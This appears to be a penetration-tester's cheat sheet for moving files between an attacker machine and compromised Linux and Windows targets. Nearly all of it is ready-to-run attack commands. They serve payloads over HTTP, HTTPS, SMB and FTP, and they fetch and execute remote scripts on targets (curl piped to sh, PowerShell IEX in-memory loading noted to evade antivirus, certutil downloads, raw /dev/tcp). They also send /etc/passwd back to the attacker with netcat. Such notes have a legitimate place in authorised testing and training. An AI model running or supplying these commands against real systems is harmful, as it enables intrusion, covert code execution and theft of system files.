# File Transfers

## Serve files from attacker

### Python HTTP server
```bash
python3 -m http.server 80
```

### Python HTTPS (when HTTP egress blocked)
```bash
# generate cert first
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes
python3 -c "import http.server, ssl; s=http.server.HTTPServer(('0.0.0.0',443),http.server.SimpleHTTPRequestHandler); s.socket=ssl.wrap_socket(s.socket,keyfile='key.pem',certfile='cert.pem',server_side=True); s.serve_forever()"
```

### SMB server (great for Windows targets)
```bash
# impacket - serves CWD as share named "share"
impacket-smbserver share $(pwd) -smb2support
# from windows target:
# copy \\$IP\share\file.exe .
# or: net use Z: \\$IP\share
```

### SMB with auth
```bash
impacket-smbserver share $(pwd) -smb2support -user user -password pass
```

### FTP server
```bash
sudo python3 -m pyftpdlib -p 21 -w
```

## Download to Linux target

### wget / curl
```bash
wget http://$IP/file -O /tmp/file
curl http://$IP/file -o /tmp/file
```
example
```bash
# Linux target
curl http://<your-vpn-ip>:80/linux/linpeas.sh | sh

# Windows target (PowerShell)
iwr -uri http://<your-vpn-ip>:80/windows/winPEASx64.exe -OutFile winpeas.exe
```
### When no wget/curl
```bash
# bash
exec 3<>/dev/tcp/$IP/80; echo -e "GET /file HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/file
```

## Download to Windows target

### Powershell
```powershell
# Modern
Invoke-WebRequest -Uri http://$IP/file.exe -OutFile C:\Users\Public\file.exe
iwr http://$IP/file.exe -o C:\Users\Public\file.exe

# Legacy / .NET
(New-Object Net.WebClient).DownloadFile('http://$IP/file.exe','C:\Users\Public\file.exe')

# Run from memory (no disk write — bypasses some AV)
IEX(New-Object Net.WebClient).DownloadString('http://$IP/script.ps1')
```

### certutil (old Windows)
```cmd
certutil -urlcache -split -f http://$IP/file.exe C:\Users\Public\file.exe
```

### SMB pull from Windows
```cmd
copy \\$IP\share\file.exe .
```

## Upload FROM target back to attacker

### nc
```bash
# attacker
nc -lvnp 4444 > received.file
# target
nc $IP 4444 < /etc/passwd
```

### SMB write (impacket)
```bash
# attacker — start smbserver with write enabled (default)
impacket-smbserver share $(pwd) -smb2support
# target (windows)
copy file.txt \\$IP\share\
```

## Encoding tricks (when binary transfer fails)

### base64 round-trip
```bash
# attacker
base64 -w0 file.bin > file.b64
# paste contents into target, then:
echo "<paste>" | base64 -d > file.bin
```

### xxd (binary as hex)
```bash
xxd -p file.bin | tr -d '\n' > file.hex
# on target
echo "<paste>" | xxd -r -p > file.bin
```
